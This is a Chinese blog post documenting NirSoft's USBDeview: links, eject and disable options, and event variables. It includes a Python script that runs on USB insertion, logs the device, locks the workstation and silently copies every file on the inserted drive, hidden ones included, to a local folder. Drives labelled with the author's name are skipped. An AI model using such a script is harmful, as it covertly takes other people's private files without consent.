---
layout:  post
title:   U盘 USBDeview
date:    2020-11-22
author:  Tangle
catalog: true
tags:
    - U盘
---

# 安装

- <http://www.nirsoft.net/utils/usb_devices_view.html>

- <https://github.com/Pericena/USBDeview>

## 转换为其他语言

- <http://www.nirsoft.net/utils/usb_devices_view.html>

- End

# 脚本

```
usbdeview-x64
    USBDeview.exe
    usbdeview_lng.ini
    main.bat
```

```
# main.exe "%device_name%" "%drive%" "%serial_number%" "%vid_hex%"

import sys
import subprocess
import time
import os
import win32gui, win32api
import threading

class App:
    def __init__(self):
        self.init()
        self.main()
        self.xcopy()

    def init(self):
        self.file_name_date = time.strftime("%Y%m%d%H%M%S")
        self.date = time.strftime("%Y-%m-%d %H:%M:%S")
        args = sys.argv
        self.device_name = args[1]
        self.drive = args[2]
        self.serial_number = args[3]
        self.vid_hex = args[4]
        self.disk_name = win32api.GetVolumeInformation(f'{self.drive}\\')[0] # 卷标
        self.pid = os.getpid()
        if "Tangle" in self.disk_name:
            exit()
        t = threading.Thread(target=self.exit_disk)
        t.start()
    
    def _exit(self):
        subprocess.call("taskkill /f /im xcopy.exe", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.call(f'taskkill /pid {self.pid}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
    def exit_disk(self):
        _time = time.time() + 3600 # 1 小时
        while True:
            var = win32gui.FindWindow('#32770', '弹出 USB 大容量存储设备 时出问题')
            var1 = win32gui.FindWindow("#32770", "Microsoft Windows")
            if var or var1:
                self._exit()
                break
            elif time.time() > _time:
                self._exit()
                break
            time.sleep(1)
        
    def main(self):
        cmd = f"""mkdir device
set file_path=device\{self.file_name_date}.txt
echo;{self.date}>%file_path%
echo.>>%file_path%
echo;{self.device_name}>>%file_path%
echo.>>%file_path%
echo;{self.disk_name}>>%file_path%
echo.>>%file_path%
USBDeview.exe /DisplayDisconnected 0 /stabular>>%file_path%
rundll32.exe user32.dll,LockWorkStation
del %0
        """
        with open('temp.bat','w') as f:
            f.write(cmd)
        subprocess.call("temp.bat", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    def xcopy(self):
        local_path = f'D:\\MTO\\MTO\\大全\\device\\{self.vid_hex}{self.serial_number}\\'
        cmd = f'xcopy {self.drive} {local_path} /e /h /d /y'
        subprocess.call(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
App()
```

# 断开命令行选项

```
/showmsg       # 消息
/stop_by_drive # 安全地移除硬件
```

```
USBDeview.exe /stop_by_drive g:
USBDeview.exe /stop_by_drive /showmsg f:
```

# 禁用启用

```
USBDeview.exe /disable_enable "USB DISK"    # 设备名称
USBDeview.exe /disable_enable_by_drive "g:" # 驱动器号
```

# 变量

```
%device_name%       # 设备名称
%device_type%       # 设备类型
%drive%             # 驱动器号
%serial_number%     # 序列号

%device_desc%       # 描述
%vid_hex%           # 厂商 ID
%pid_hex%           # 产品 ID
%vid%               # 厂商 ID
%pid%               # 产品 ID
%service_name%      # 服务名称
%device_class%      # USB 类别
%device_mfg%        # 设备商
%driver_file%       # 驱动文件名
%driver_version%    # 驱动版本
%power%             # 电源
%firmware_revision% # 固件修正版
%vendor_name%       # 厂商名称
%product_name%      # 产品名称
%usb_version%       # USB 版本
```
